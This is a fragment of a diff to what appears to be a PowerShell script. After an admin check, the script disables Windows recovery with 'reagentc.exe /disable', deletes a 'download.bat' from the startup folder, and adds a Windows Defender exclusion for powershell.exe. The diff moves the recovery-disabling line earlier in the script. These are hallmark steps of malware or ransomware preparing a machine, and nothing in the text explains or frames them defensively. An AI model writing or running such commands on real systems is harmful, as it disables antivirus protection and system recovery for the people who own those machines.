@@ -54,6 +54,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     }
 }
 
+reagentc.exe /disable
 Remove-Item -Path "$startupfolder\download.bat" -Force
 Add-MpPreference -ExclusionProcess "powershell.exe"
 
@@ -151,4 +152,4 @@ foreach ($path in $discPaths) {
     }
 }
 
-reagentc.exe /disable
+
